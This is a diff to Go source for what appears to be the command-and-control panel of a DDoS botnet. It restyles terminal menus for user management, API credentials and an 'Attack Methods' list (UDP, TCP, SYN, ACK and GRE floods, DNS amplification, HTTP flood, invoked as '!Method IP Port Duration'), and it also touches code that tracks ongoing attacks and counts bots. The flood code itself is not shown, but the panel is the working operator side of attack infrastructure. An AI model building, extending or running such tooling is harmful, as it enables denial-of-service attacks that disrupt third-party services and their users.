-					conn.Write([]byte("\033[3J\033[H\033[2J"))
-					conn.Write([]byte("\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))
-					conn.Write([]byte("\033[2J\033[H"))
-					conn.Write([]byte("\r\n"))
-					conn.Write([]byte("\r\n"))
-					conn.Write([]byte("\x1b[38;5;231m╭══════════════════════════════════════════════════════════════════════════════╮\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║                               \x1b[38;5;51mHello Master\x1b[38;5;231m                                   ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m╠══════════════════════════════════════════════════════════════════════════════╢\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m1. gif          \x1b[38;5;231m║ Add a new user          ║                                ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m2. deluser      \x1b[38;5;231m║ Delete a user           ║                                ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m4. rbac         \x1b[38;5;231m║ Manage RBAC permissions ║                                ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m5. session      \x1b[38;5;231m║ Show users sessions+Kill║                                ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m╰══════════════════════════════════════════════╩═══════════════════════════════╯\n\r"))
 
 				case "adduser":
 					if client.user.GetLevel() > Admin {
@@ -858,15 +1004,22 @@ func handleRequest(conn *tls.Conn) {
 					conn.Write([]byte("\033[2J\033[H"))
 					conn.Write([]byte("\033[3J\033[H\033[2J"))
 					conn.Write([]byte("\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))
-					conn.Write([]byte("\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))
-					conn.Write([]byte("\x1b[38;5;231m╭══════════════════════════════════════════════════════════════════════════════╮\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║                        \x1b[38;5;51mUser Added Successfully! \x1b[38;5;231m                             ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m╠══════════════════════════════════════════════════════════════════════════════╢\n\r"))
-					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║ Username: %-51s                ║\r\n", username)))
-					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║ Level:    %-51s                ║\r\n", level)))
-					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║ API Token: %-49s                 ║\r\n", apiToken)))
-					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║ API Secret: %-49s                ║\r\n", apiSecret)))
-					conn.Write([]byte("\x1b[38;5;231m╰══════════════════════════════════════════════════════════════════════════════╯\r\n"))
+					conn.Write([]byte("\r\n"))
+					conn.Write([]byte("\x1b[38;5;231m╭═══════════════════════════════════════════════╦══════════════════════════════╮\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║             § \x1b[38;5;51mUser Added Successfully!\x1b[38;5;231m §      ║    ┌────────────────────┐    ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣    │    USER CREATED    │    ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║ \x1b[38;5;45m● User Account Details\x1b[38;5;231m                        ║    │     ● SUCCESS      │    ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣    └────────────────────┘    ║\n\r"))
+					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Username: \x1b[38;5;45m%-30s\x1b[38;5;231m  ║    ░░░░░░░░░░░░░░░░░░░░░░    ║\r\n", username)))
+					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Level:    \x1b[38;5;45m%-30s\x1b[38;5;231m  ║     ────────────────────     ║\r\n", level)))
+					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Expires:  \x1b[38;5;45m%-30s\x1b[38;5;231m  ║     ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒     ║\r\n", time.Now().AddDate(1, 0, 0).Format("2006-01-02"))))
+					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╬══════════════════════════════╣\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║ \x1b[38;5;45m● API Credentials\x1b[38;5;231m                             ║    ┌────────────────────┐    ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣    │   SECURE TOKENS    │    ║\n\r"))
+					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m API Token:  \x1b[38;5;45m%-28s\x1b[38;5;231m  ║    │    GENERATED       │    ║\r\n", apiToken)))
+					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m API Secret: \x1b[38;5;45m%-28s\x1b[38;5;231m  ║    └────────────────────┘    ║\r\n", apiSecret)))
+					conn.Write([]byte("\x1b[38;5;231m╰═══════════════════════════════════════════════╩══════════════════════════════╯\r\n"))
+
 				case "deluser":
 					if client.user.GetLevel() > Admin {
 						writeError(conn, "Insufficient permissions.")
@@ -906,12 +1059,21 @@ func handleRequest(conn *tls.Conn) {
 					conn.Write([]byte("\033[2J\033[H"))
 					conn.Write([]byte("\033[3J\033[H\033[2J"))
 					conn.Write([]byte("\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))
-					conn.Write([]byte("\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))
-					conn.Write([]byte("\x1b[38;5;231m╭══════════════════════════════════════════════════════════════════════════════╮\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║                       \x1b[38;5;51mUser Deleted Successfully! \x1b[38;5;231m                            ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m╠══════════════════════════════════════════════════════════════════════════════╢\n\r"))
-					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║ Username: %-51s                ║\r\n", username)))
-					conn.Write([]byte("\x1b[38;5;231m╰══════════════════════════════════════════════════════════════════════════════╯\r\n"))
+					conn.Write([]byte("\r\n"))
+					conn.Write([]byte("\x1b[38;5;231m╭═══════════════════════════════════════════════╦══════════════════════════════╮\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║             § \x1b[38;5;51mUser Deleted Successfully!\x1b[38;5;231m §    ║    ┌────────────────────┐    ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣    │    USER REMOVED    │    ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║ \x1b[38;5;45m● Account Removal Confirmation\x1b[38;5;231m                ║    │     ● DELETED      │    ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣    └────────────────────┘    ║\n\r"))
+					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Username: \x1b[38;5;45m%-30s\x1b[38;5;231m  ║    ░░░░░░░░░░░░░░░░░░░░░░    ║\r\n", username)))
+					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Status:   \x1b[38;5;45mPERMANENTLY DELETED\x1b[38;5;231m             ║     ────────────────────     ║\r\n"))
+					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Time:     \x1b[38;5;45m%-30s\x1b[38;5;231m  ║     ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒     ║\r\n", time.Now().Format("2006-01-02"))))
+					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╬══════════════════════════════╣\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║ \x1b[38;5;45m● Database Update\x1b[38;5;231m                             ║    ┌────────────────────┐    ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣    │  RECORDS UPDATED   │    ║\n\r"))
+					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Total Users: \x1b[38;5;45m%-26d\x1b[38;5;231m   ║    │     COMPLETE       │    ║\r\n", len(users))))
+					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Action:    \x1b[38;5;45mIRREVERSIBLE\x1b[38;5;231m                   ║    └────────────────────┘    ║\r\n"))
+					conn.Write([]byte("\x1b[38;5;231m╰═══════════════════════════════════════════════╩══════════════════════════════╯\r\n"))
 				case "users":
 					usersFile, err := os.ReadFile("data/json/users.json")
 					if err != nil {
@@ -922,43 +1084,68 @@ func handleRequest(conn *tls.Conn) {
 					json.Unmarshal(usersFile, &users)
 					var content []string
 					for _, user := range users {
-						line := fmt.Sprintf("User: %s | Level: %-8s | Expires: %s",
+						line := fmt.Sprintf("User: %s ██ Level: %-8s ██ Expires: %s ",
 							user.Username, user.Level, user.Expire.Format("2006-01-02"))
 						content = append(content, line)
 					}
 					conn.Write([]byte("\033[2J\033[H"))
 					conn.Write([]byte("\033[3J\033[H\033[2J"))
 					conn.Write([]byte("\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))
-					conn.Write([]byte("\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))
-					conn.Write([]byte("\x1b[38;5;231m╭══════════════════════════════════════════════════════════════════════════════╮\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║                                 \x1b[38;5;51mUser List\x1b[38;5;231m                                    ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m╠══════════════════════════════════════════════════════════════════════════════╢\n\r"))
-					for _, line := range content {
+					conn.Write([]byte("\r\n"))
+					conn.Write([]byte("\x1b[38;5;231m╭═══════════════════════════════════════════════╦══════════════════════════════╮\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║              § \x1b[38;5;51mRegistered Users\x1b[38;5;231m §             ║    ┌─┐ ┌─┐ ┌─┐ ┌─┐ ┌─┐       ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣    │ │ │ │ │ │ │ │ │ │       ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║ \x1b[38;5;45mUsername        Level     Expiration\x1b[38;5;231m          ║    └─┘ └─┘ └─┘ └─┘ └─┘       ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╩══════════╦═══════════════════╣\n\r"))
+
+					// Display users with alternating bullets
+					for i, line := range content {
 						if len(line) > 76 {
 							line = line[:76]
 						}
-						paddedLine := fmt.Sprintf("%-76s", line)
-						conn.Write([]byte("\x1b[38;5;231m║ " + paddedLine + " ║\n\r"))
+						paddedLine := fmt.Sprintf("%-44s", line)
+						bullet := "\x1b[38;5;45m❃"
+						if i%2 == 0 {
+							bullet = "\x1b[38;5;45m✪"
+						}
+
+						// Right side art that changes every few lines
+						rightArt := "  USER DATABASE  "
+						switch i % 2 {
+						case 0:
+							rightArt = "  ACCESS LEVELS  "
+						}
+
+						conn.Write([]byte("\x1b[38;5;231m║ " + bullet + " " + paddedLine + " \x1b[38;5;231m║ " + rightArt + " ║\n\r"))
 					}
+
+					conn.Write([]byte("\x1b[38;5;231m╠══════════════════════════════════════════════════════════╩═══════════════════╣\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║                          \x1b[38;5;51mTotal Users: " + fmt.Sprintf("%-2d", len(users)) + "\x1b[38;5;231m                                     ║\n\r"))
 					conn.Write([]byte("\x1b[38;5;231m╰══════════════════════════════════════════════════════════════════════════════╯\n\r"))
 				case "methods", "?":
 					conn.Write([]byte("\033[2J\033[H"))
 					conn.Write([]byte("\033[3J\033[H\033[2J"))
 					conn.Write([]byte("\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))
-					conn.Write([]byte("\033[2J\033[H"))
-					conn.Write([]byte("\x1b[38;5;231m╭══════════════════════════════════════════════════════════════════════════════╮\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║                                  \x1b[38;5;51mAttack Menu\x1b[38;5;231m                                 ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m╠══════════════════════════════════════════════════════════════════════════════╢\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m1. !udpsmart     \x1b[38;5;231m║ Simple UDP Bypass                                       ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m2. !udpflood     \x1b[38;5;231m║ Basic UDP Flood                                         ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m3. !tcpflood     \x1b[38;5;231m║ Basic TCP Flood                                         ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m4. !synflood     \x1b[38;5;231m║ Basic SYN Flood                                         ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m5. !ackflood     \x1b[38;5;231m║ Basic ACK Flood                                         ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m6. !greflood     \x1b[38;5;231m║ Basic GRE Flood                                         ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m7. !dns          \x1b[38;5;231m║ Simple DNS Amplification                                ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m8. !http         \x1b[38;5;231m║ Simple HTTP Flood                                       ║\n\r"))
+					conn.Write([]byte("\r\n"))
+					conn.Write([]byte("\x1b[38;5;231m╭═══════════════════════════════════════════════╦══════════════════════════════╮\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║                § \x1b[38;5;51mAttack Methods\x1b[38;5;231m §             ║ ●━━━━●━━━━●━━━●━━━●━━━●━━━━● ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m╠════════════════════╦══════════════════════════╢  │    │    │    │    │    │  ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;41m  Method Name    \x1b[38;5;231m║  \x1b[38;5;41m   Description          \x1b[38;5;231m║░░▒▒▓▓████▓▓▒▒░░▒▒▓▓████▓▓▒▒░░║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m╠════════════════════╬══════════════════════════╬══════════════════════════════╣\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃. !udpsmart     \x1b[38;5;231m║ Simple UDP Bypass        ║ ╔══════════════════════════╗ ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪. !udpflood     \x1b[38;5;231m║ Basic UDP Flood          ║ ║        LAYER 4           ║ ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃. !tcpflood     \x1b[38;5;231m║ Basic TCP Flood          ║ ║     TCP/UDP/SCTP         ║ ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪. !synflood     \x1b[38;5;231m║ Basic SYN Flood          ║ ║                          ║ ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃. !ackflood     \x1b[38;5;231m║ Basic ACK Flood          ║ ╠══════════════════════════╣ ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪. !greflood     \x1b[38;5;231m║ Basic GRE Flood          ║ ║        LAYER 7           ║ ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃. !dns          \x1b[38;5;231m║ DNS Amplification        ║ ║    HTTP/HTTPS/DNS        ║ ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪. !http         \x1b[38;5;231m║ Simple HTTP Flood        ║ ╚══════════════════════════╝ ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m╠════════════════════╩══════════════════════════╢ ╔══════════════════════════╗ ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║             § \x1b[38;5;51mUsage & Information\x1b[38;5;231m §           ║ ║ [1][2][3][4][5][6][7][8] ║ ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╯ ║  ●  ●  ○  ●  ○  ●  ○  ●  ║ ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║  \x1b[38;5;45mEg.. !Method IP Port Duration ⚑  \x1b[38;5;231m              ║     PROTOCOL STATUS      ║ ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║  \x1b[38;5;45mAll methods require parameters   \x1b[38;5;231m              ╚══════════════════════════╝ ║\n\r"))
 					conn.Write([]byte("\x1b[38;5;231m╰══════════════════════════════════════════════════════════════════════════════╯\n\r"))
-
 				case "rbac":
 					if client.user.GetLevel() > Admin {
 						writeError(conn, "Insufficient permissions.")
@@ -1080,12 +1267,12 @@ func getBotCount() int {
 	return int(atomic.LoadInt32(&connectionPool.currentSize))
 }
 
-func RecordAPIAttack(a attack) string {
+func RecordAPIAttack(a Attack) string {
 	id := fmt.Sprintf("%d-%s", time.Now().UnixNano(), a.user)
 	apiAttackLock.Lock()
 	ongoingAPIAttacks[id] = a
 	apiAttackLock.Unlock()
-	go func(id string, a attack) {
+	go func(id string, a Attack) {
 		time.Sleep(a.duration)
 		apiAttackLock.Lock()
 		delete(ongoingAPIAttacks, id)
@@ -1095,8 +1282,9 @@ func RecordAPIAttack(a attack) string {
 	return id
 }
 
-func GetAllOngoingAttacks() []attack {
-	var combined []attack
+func GetAllOngoingAttacks() []Attack {
+	var combined []Attack
+
 	attackLock.Lock()
 	for _, a := range ongoingAttacks {
 		if time.Now().Before(a.start.Add(a.duration)) {
@@ -1104,6 +1292,7 @@ func GetAllOngoingAttacks() []attack {
 		}
 	}
 	attackLock.Unlock()
+
 	apiAttackLock.Lock()
 	for _, a := range ongoingAPIAttacks {
 		if time.Now().Before(a.start.Add(a.duration)) {
@@ -1111,5 +1300,6 @@ func GetAllOngoingAttacks() []attack {
 		}
 	}
 	apiAttackLock.Unlock()
+
 	return combined
 }
